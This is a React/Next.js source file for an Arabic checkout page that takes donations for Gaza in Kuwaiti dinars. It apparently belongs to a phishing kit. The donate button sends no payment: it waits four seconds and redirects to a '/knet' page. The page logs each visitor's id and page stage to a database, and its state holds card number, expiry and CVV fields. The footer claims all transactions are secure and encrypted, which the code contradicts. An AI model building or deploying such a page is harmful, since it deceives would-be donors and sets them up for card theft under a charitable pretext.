/* eslint-disable */
"use client"

import type React from "react"

import { useState, useEffect } from "react"
import Image from "next/image"
import Link from "next/link"
import { useRouter } from "next/navigation"
import { ChevronDown, Check } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible"
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { addData, handlePay } from "@/lib/db"
import { DialogLoader } from "@/components/dilog-loader"

export default function CheckoutPage() {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(false)
  const [isGccOpen, setIsGccOpen] = useState(false)
  const [paymentMethod, setPaymentMethod] = useState("credit-card")
  const [amount, setAmount] = useState<string | null>(null)
  const [donationAmount, setDonationAmount] = useState<string | null>(null)
  const [visitorId, setVisitorId] = useState<string | null>(null)
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phoneNumber: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    country: "kuwait",
    status: "new",
  })

  // Safely access localStorage after component mounts
  useEffect(() => {
    setAmount(localStorage.getItem("amount"))
    setDonationAmount(localStorage.getItem("amount"))
    setVisitorId(localStorage.getItem("visitor"))
    if(visitorId){
      addData({id:visitorId, createdDate: new Date().toISOString(),
        currentPage: "قبل الدفع",
})
    }
  }, [])

  const projectName = "تبرع  لغزة"

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setFormData((prev) => ({ ...prev, [name]: value }))
  }

  const handleSelectChange = (name: string, value: string) => {
    setFormData((prev) => ({ ...prev, [name]: value }))
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      // Create form data to send to server action
      const formDataToSubmit = new FormData()
      formDataToSubmit.append("name", formData.name)
      formDataToSubmit.append("email", formData.email)
      formDataToSubmit.append("phoneNumber", formData.phoneNumber)
      formDataToSubmit.append("amount", donationAmount!.toString())
      formDataToSubmit.append("projectName", projectName)
      formDataToSubmit.append("paymentMethod", paymentMethod)

setTimeout(() => {
    router.push(`/knet`)
}, 4000);     
      // Process donation
    } catch (error) {
      console.error("Error submitting donation:", error)
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="flex flex-col min-h-screen bg-gray-50 text-right" dir="rtl">
      <DialogLoader isOpen={isLoading} message="يرجى الانتظار..."/>

      <main className="flex-1 max-w-3xl mx-auto w-full p-4 py-8">
        <div className="grid md:grid-cols-5 gap-8">
          {/* Payment Form */}
          <div className="md:col-span-2">
            <Card dir="rtl">
              <CardContent>
                <div className="flex flex-col items-center bg-white max-w-md mx-auto p-4 rtl">
                  {/* Main content */}
                  <div className="w-full">
                    {/* Form section */}
                    <div className="text-center mb-8">
                      <p className="text-right font-medium mb-4">
                        باختيار فاعل خير. لن نستطيع أن نرسل لك رسائل نصية أو بريد أو تقارير حول المشروع
                      </p>
                      <p className="text-right text-gray-500 text-sm mb-2">(اختياري) رقم الهاتف</p>
                      <Input
                        className="w-full border rounded p-2 text-right"
                        placeholder="من فضلك ادخل رقم الهاتف"
                        name="phoneNumber"
                        value={formData.phoneNumber}
                        onChange={handleInputChange}
                      />
                    </div>

                    {/* Project details */}
                    <div className="flex justify-between items-center border-b pb-4 mb-4">
                      <div className="text-right">
                        <p className="text-gray-500">المبلغ</p>
                      </div>
                      <div className="text-right">
                        <p className="font-bold">الاسم/المشروع</p>
                      </div>
                    </div>

                    {/* Donation item */}
                    <div className="flex justify-between items-center border-b pb-4 mb-4">
                      <div className="flex items-center">
                        <div className="bg-orange-500 text-white rounded-full w-6 h-6 flex items-center justify-center mr-2">
                          <span className="text-xs">●</span>
                        </div>
                        <p className="font-medium">{amount} د.ك</p>
                      </div>
                      <div className="text-right">
                        <p className="font-bold">نصرة غزة</p>
                      </div>
                    </div>

                    {/* Donation amount */}
                    <div className="text-right mb-6">
                      <p className="font-bold text-lg">
                        مبلغ التبرع: <span className="text-orange-500">{amount} د.ك</span>
                      </p>
                    </div>

                    {/* Payment methods */}
                    <div className="flex justify-center gap-2 mb-6">
                      <div
                        className={`border rounded p-2 w-16 h-10 flex items-center justify-center cursor-pointer ${paymentMethod === "visa" ? "border-blue-500 border-2" : ""}`}
                        onClick={() => setPaymentMethod("knet")}
                      >
                        <Image src="/visa.png" alt="Visa" width={50} height={30} className="gs"/>
                      </div>
                      <div
                        className={`border rounded p-2 w-16 h-10 flex items-center justify-center cursor-pointer ${paymentMethod === "mastercard" ? "border-blue-500 border-2" : ""}`}
                        onClick={() => setPaymentMethod("knet")}
                      >
                        <Image src="/mas.png" alt="Mastercard" width={50} height={30} className="gs" />
                      </div>
                   
                      <div
                        className={`border rounded p-2 w-16 h-10 flex items-center justify-center cursor-pointer ${paymentMethod === "knet" ? "border-blue-500 border-2" : "border-blue-500 border-2"}`}
                        onClick={() => setPaymentMethod("knet")}
                      >
                        <Image src="/knet.png" alt="KNET" width={50} height={30}  />
                      </div>
                    </div>
                    {/* Donate button */}
                    <Button
                      onClick={handleSubmit}
                      className="w-full bg-orange-500 hover:bg-orange-600 text-white py-3 rounded"
                      disabled={isLoading}
                    >
                      {isLoading ? "جاري المعالجة..." : "تبرع الآن"}
                    </Button>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Order Summary */}
          <div className="md:col-span-2">
            <Card>
              <CardHeader>
                <CardTitle>ملخص التبرع</CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex justify-between items-center pb-4 border-b">
                  <div className="font-medium">المشروع</div>
                  <div className="bg-gray-200 px-3 py-1 rounded-md">{projectName}</div>
                </div>

                <div className="flex justify-between items-center">
                  <div className="font-medium">المبلغ</div>
                  <div className="flex items-center">
                    <div className="bg-orange-500 text-white rounded-full w-6 h-6 flex items-center justify-center ml-2">
                      <Check className="w-4 h-4" />
                    </div>
                    <span className="font-bold">{donationAmount} د.ك</span>
                  </div>
                </div>

                <Collapsible open={isGccOpen} onOpenChange={setIsGccOpen} className="border-t border-b py-3 mt-4">
                  <CollapsibleTrigger className="flex items-center justify-between w-full">
                    <span>التبرع من إحدى دول مجلس التعاون</span>
                    <ChevronDown
                      className={`transition-transform duration-200 ${isGccOpen ? "transform rotate-180" : ""}`}
                    />
                  </CollapsibleTrigger>
                  <CollapsibleContent className="pt-4">
                    <div className="grid grid-cols-3 gap-2">
                      <Button variant="outline" className="text-sm">
                        الكويت
                      </Button>
                      <Button variant="outline" className="text-sm">
                        السعودية
                      </Button>
                      <Button variant="outline" className="text-sm">
                        الإمارات
                      </Button>
                      <Button variant="outline" className="text-sm">
                        قطر
                      </Button>
                      <Button variant="outline" className="text-sm">
                        البحرين
                      </Button>
                      <Button variant="outline" className="text-sm">
                        عمان
                      </Button>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </CardContent>
              <CardFooter className="flex flex-col">
                <div className="text-center text-sm text-muted-foreground mb-4">جميع المعاملات آمنة ومشفرة</div>
              </CardFooter>
            </Card>

            <div className="mt-4 text-sm text-muted-foreground">
              <p>
                بالضغط على زر "تبرع الآن"، أنت توافق على{" "}
                <Link href="#" className="text-primary hover:underline">
                  شروط الخدمة
                </Link>{" "}
                و
                <Link href="#" className="text-primary hover:underline">
                  سياسة الخصوصية
                </Link>
                .
              </p>
            </div>
          </div>
        </div>
      </main>
    </div>
  )
}

